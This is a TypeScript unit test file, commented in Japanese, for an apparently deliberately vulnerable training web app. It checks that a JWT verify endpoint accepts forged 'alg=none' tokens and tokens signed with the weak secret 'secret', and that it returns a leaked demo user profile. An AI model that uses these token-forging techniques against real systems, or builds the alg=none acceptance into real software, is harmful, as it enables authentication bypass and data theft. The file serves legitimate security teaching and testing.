/**
 * victim-web 単体テスト: POST /jwt/verify (jwt-alg-none 脆弱エンドポイント)
 *
 * orchestrator を介さずに victim-web 単体の脆弱性が成立することを直接確認する。
 * orchestrator 経由の e2e は server/__tests__/orchestrator-live.test.ts でカバーされている。
 *
 * DESIGN/32 §4.1 / §8.1 (必須テスト): "POST /jwt/verify — alg=none で 200 が返ること"
 * DESIGN/35 PR-A 波及: leakedToAttacker フィールドの存在を検証
 */
import { describe, it, expect } from "vitest";
import { Hono } from "hono";
import jwt from "jsonwebtoken";
import { jwtVulnRoutes } from "../src/routes/jwt-vuln.js";

function createApp() {
  const app = new Hono();
  app.route("/jwt", jwtVulnRoutes);
  return app;
}

/** alg=none + 空署名で claims を載せた偽造 JWT を作る */
function buildAlgNoneToken(payload: Record<string, unknown>): string {
  const header = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" })).toString("base64url");
  const body = Buffer.from(JSON.stringify(payload)).toString("base64url");
  return `${header}.${body}.`;
}

describe("victim-web: POST /jwt/verify (CWE-345 jwt-alg-none)", () => {
  it("alg=none + 空署名トークンで 200 + valid: true を返す (脆弱性の核心)", async () => {
    const app = createApp();
    const token = buildAlgNoneToken({ sub: "seed_alice", role: "admin" });
    const res = await app.request("/jwt/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ token }),
    });
    expect(res.status).toBe(200);
    const json = (await res.json()) as {
      valid: boolean;
      algorithm: string;
      claims: { sub: string; role: string };
      note?: string;
    };
    expect(json.valid).toBe(true);
    expect(json.algorithm).toBe("none");
    expect(json.claims.sub).toBe("seed_alice");
    expect(json.claims.role).toBe("admin");
    expect(json.note).toContain("alg=none accepted");
  });

  it("alg=none 経路で seed user の leakedToAttacker プロファイルが返る (storyboard data-leak 用)", async () => {
    const app = createApp();
    const token = buildAlgNoneToken({ sub: "seed_alice", role: "admin" });
    const res = await app.request("/jwt/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ token }),
    });
    expect(res.status).toBe(200);
    const json = (await res.json()) as {
      leakedToAttacker: {
        userId: number;
        username: string;
        role: string;
        email: string;
        demoApiKey: string;
        demoBalance: string;
      } | null;
    };
    expect(json.leakedToAttacker).not.toBeNull();
    expect(json.leakedToAttacker!.username).toBe("seed_alice");
    expect(json.leakedToAttacker!.email).toBe("alice@victim.local");
    expect(json.leakedToAttacker!.demoApiKey).toMatch(/^sk_demo_alice_REDACTED_/);
    expect(json.leakedToAttacker!.demoBalance).toMatch(/^\$/);
    // 教材ヒントヘッダ
    expect(res.headers.get("X-Token-Alg")).toBe("none");
    expect(res.headers.get("X-Forged-Sub")).toBe("seed_alice");
    expect(res.headers.get("X-Forged-Role")).toBe("admin");
  });

  it("未知の sub の場合 leakedToAttacker は null になる (claims は通っても profile 不在)", async () => {
    const app = createApp();
    const token = buildAlgNoneToken({ sub: "ghost_user", role: "admin" });
    const res = await app.request("/jwt/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ token }),
    });
    expect(res.status).toBe(200);
    const json = (await res.json()) as {
      valid: boolean;
      leakedToAttacker: unknown;
    };
    expect(json.valid).toBe(true);
    expect(json.leakedToAttacker).toBeNull();
  });

  it("HS256 + WEAK_SECRET 経由でも seed user の leakedToAttacker が返る", async () => {
    const app = createApp();
    const token = jwt.sign({ sub: "seed_admin", role: "admin" }, "secret", { algorithm: "HS256" });
    const res = await app.request("/jwt/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ token }),
    });
    expect(res.status).toBe(200);
    const json = (await res.json()) as {
      valid: boolean;
      algorithm: string;
      leakedToAttacker: { username: string; role: string } | null;
    };
    expect(json.valid).toBe(true);
    expect(json.algorithm).toBe("HS256");
    expect(json.leakedToAttacker).not.toBeNull();
    expect(json.leakedToAttacker!.username).toBe("seed_admin");
    expect(json.leakedToAttacker!.role).toBe("admin");
    expect(res.headers.get("X-Token-Alg")).toBe("HS256");
  });

  it("token フィールド欠如時は 400 を返す (最小バリデーション)", async () => {
    const app = createApp();
    const res = await app.request("/jwt/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({}),
    });
    expect(res.status).toBe(400);
    const json = (await res.json()) as { valid: boolean; error: string };
    expect(json.valid).toBe(false);
    expect(json.error).toContain("token");
  });

  it("Invalid JSON body で 400 を返す", async () => {
    const app = createApp();
    const res = await app.request("/jwt/verify", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: "not-json",
    });
    expect(res.status).toBe(400);
    const json = (await res.json()) as { valid: boolean; error: string };
    expect(json.valid).toBe(false);
    expect(json.error).toBe("Invalid JSON body");
  });
});
